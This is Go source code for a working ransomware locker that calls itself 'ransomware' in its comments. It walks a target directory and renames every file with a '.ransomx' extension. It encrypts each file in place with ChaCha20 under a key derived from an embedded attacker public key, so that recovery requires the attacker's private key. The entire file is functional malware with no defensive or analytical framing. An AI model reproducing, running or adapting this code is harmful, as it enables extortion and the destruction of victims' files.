package main

import (
	"crypto/ecdh"
	"crypto/rand"
	"crypto/sha256"
	_ "embed"
	"fmt"
	"golang.org/x/crypto/chacha20"
	"log"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
)

var (
	//go:embed public.key
	embeddedPublicKey []byte
	wg                sync.WaitGroup
	lock              sync.Mutex
	processed         int
	extension         = ".ransomx"
)

const (
	bufferSize = 0x100000 // 1 Mb
)

func cryptContext() (*ecdh.PublicKey, []byte, []byte, error) {
	var (
		curve      = ecdh.X25519()
		privateKey *ecdh.PrivateKey
		publicKey  *ecdh.PublicKey
		serverKey  *ecdh.PublicKey
		sharedKey  []byte
		keySum     [32]byte
		nonceSum   [32]byte
		err        error
	)

	// generate ephemeral private key for our ransomware
	if privateKey, err = curve.GenerateKey(rand.Reader); err != nil {
		return nil, nil, nil, err
	}

	publicKey = privateKey.PublicKey()

	if serverKey, err = curve.NewPublicKey(embeddedPublicKey); err != nil {
		return nil, nil, nil, err
	}

	// derive the shared secret for the embedded
	// public key and the now generated private key
	if sharedKey, err = privateKey.ECDH(serverKey); err != nil {
		return nil, nil, nil, err
	}

	keySum = sha256.Sum256(sharedKey)
	nonceSum = sha256.Sum256(keySum[:])

	return publicKey, keySum[:], nonceSum[:12], nil
}

// lockFile
// takes the given file and encrypts the content of it
// using the shared-secret key from the public key
func lockFile(path string) {
	var (
		err    error
		file   *os.File
		cipher *chacha20.Cipher
		stat   os.FileInfo
		length int64
		offset int64
		buffer []byte

		publicKey *ecdh.PublicKey
		chachaKey []byte
		chachaIv  []byte
	)

	defer wg.Done()

	// if the given file already has the file extension then we will
	// assume that it already has been processed and encrypted
	if strings.HasSuffix(path, extension) {
		return
	}

	if err = os.Rename(path, path+extension); err != nil {
		fmt.Printf("[!] renaming file %v failed: %v\n", path, err)
		return
	}

	publicKey, chachaKey, chachaIv, err = cryptContext()
	if err != nil {
		fmt.Printf("[!] crypt context for file %v failed: %v\n", path, err)
		return
	}

	cipher, err = chacha20.NewUnauthenticatedCipher(chachaKey, chachaIv)
	if err != nil {
		fmt.Printf("[!] chacha20 context for file %v failed: %v\n", path, err)
		return
	}

	if file, err = os.OpenFile(path+extension, os.O_RDWR, 0); err != nil {
		fmt.Printf("[!] opening file %v failed: %v\n", path, err)
		return
	}

	defer file.Close()

	if stat, err = file.Stat(); err != nil {
		fmt.Printf("[!] opening file %v failed: %v\n", path, err)
		return
	}

	length = stat.Size()
	buffer = make([]byte, bufferSize)

	for offset < length {
		var (
			remaining = length - offset
			chunkSize = bufferSize
			n         int
		)

		if remaining < bufferSize {
			chunkSize = int(remaining)
		}

		n, err = file.ReadAt(buffer[:chunkSize], offset)
		if err != nil {
			fmt.Printf("[!] reading file %v failed: %v\n", path, err)
			return
		}

		if n == 0 {
			break
		}

		cipher.XORKeyStream(buffer[:n], buffer[:n])

		_, err = file.WriteAt(buffer[:n], offset)
		if err != nil {
			fmt.Printf("[!] writing file %v failed: %v\n", path, err)
			return
		}

		offset += int64(n)
	}

	_, err = file.WriteAt(publicKey.Bytes(), offset)
	if err != nil {
		fmt.Printf("[!] writing file %v failed: %v\n", path, err)
		return
	}

	lock.Lock()
	processed++
	defer lock.Unlock()

	return
}

func main() {
	var (
		err        error
		path       string
		queueMax   int
		queueCount int
	)

	queueMax = runtime.GOMAXPROCS(0) * 2

	if len(os.Args) < 2 {
		fmt.Println("Usage: locker <path>")
		return
	}

	path = os.Args[1]
	fmt.Println("[!] locking path =", path)

	err = filepath.Walk(path, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			fmt.Println("\r[-] " + err.Error())
			return nil
		}

		if !info.IsDir() {
			// if the maximum queue workers have been reached then wait
			// until they finish to avoid resource exhaustion
			if queueCount >= queueMax {
				wg.Wait()
				queueCount = 0
			}

			wg.Add(1)
			queueCount++

			go lockFile(path)
		}

		return nil
	})

	if err != nil {
		log.Println(err)
	}

	fmt.Println("[*] waiting for all files to be processed")
	wg.Wait()

	fmt.Printf("[+] finishing the ransom-osx [files processed: %v]\n", processed)
}
